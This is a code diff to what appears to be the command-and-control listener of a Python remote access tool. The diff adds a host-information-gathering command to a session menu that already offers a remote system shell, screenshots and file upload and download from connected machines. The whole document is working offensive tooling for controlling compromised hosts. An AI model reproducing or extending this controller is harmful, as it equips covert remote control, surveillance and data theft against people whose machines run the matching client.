@@ -13,6 +13,7 @@ from serverModule.shell import Shell
 from lib.dsSocket import *
 from serverModule.fileOperation import FileOPT
 from serverModule.screen import Screen
+from serverModule.infoGather import infoGather
 from argparse import ArgumentParser
 
 class Listening():
@@ -25,7 +26,7 @@ class Listening():
 
     def parseArgs(self):
         parser = ArgumentParser(prog=self.keyWord)
-        parser.add_argument("-lh", "--lhost", type=str, required=False, default="0.0.0.0", help=f"The listening host, default is 0.0.0.0")
+        parser.add_argument("-lh", "--lhost", type=str, required=True, help=f"The listening host")
         parser.add_argument("-lp", "--lport", type=int, required=False, default=1116, help=f"The listening port, default is 1116")
         return parser.parse_args()
 
@@ -68,7 +69,7 @@ class Listening():
             os.chdir(r"..")
             while True:
                 try:
-                    choice = input(Colors.RED + "Session > " + Colors.END).lower()
+                    choice = input(Colors.RED + "Session> " + Colors.END).lower()
                     if choice in optionsList:
                         pass
                     if choice == "shell":
@@ -81,6 +82,8 @@ class Listening():
                         FileOPT(choice, clientSocket).fileDownload()
                     elif choice.lower() == "screen":
                         Screen(clientSocket)
+                    elif choice.lower() == "info":
+                        infoGather(clientSocket, clientAddress)
                     elif choice.lower() == "help":
                         self.usage()
                     elif choice in ["quit", "q", "exit"]:
@@ -96,14 +99,16 @@ class Listening():
             server.close()
 
     def usage(self):
-        usage = "\nCommand".ljust(50) + "Description\n"
-        usage += "-" * 100 + "\n"
-        usage += "Hint: [] is required, and <> is optional".center(80) + "\n"
-        usage += "shell".ljust(50) + "Into a system shell\n"
-        usage += "upload [localFile] <remoteName>".ljust(50) + "upload a local file to remote machine\n"
-        usage += "download [remoteFile] <localName>".ljust(50) + "download a remote file to local machine\n"
-        usage += "help".ljust(50) + "show the usage\n"
-        print(usage)
+        usage = """
+------------------------------------------------------------------------------------
+    shell                                   into a system shell
+    screen                                  screenshots
+    upload     [localFile] <remoteName>     upload a local file to remote machine
+    download   [remoteFile] <localName>     download a remote file to local machine
+    info                                    collect host information
+    help                                    show the usage
+        """
+        print(f"\033[34m{usage}\033[0m")
 
 if __name__ == "__main__":
     Listening()
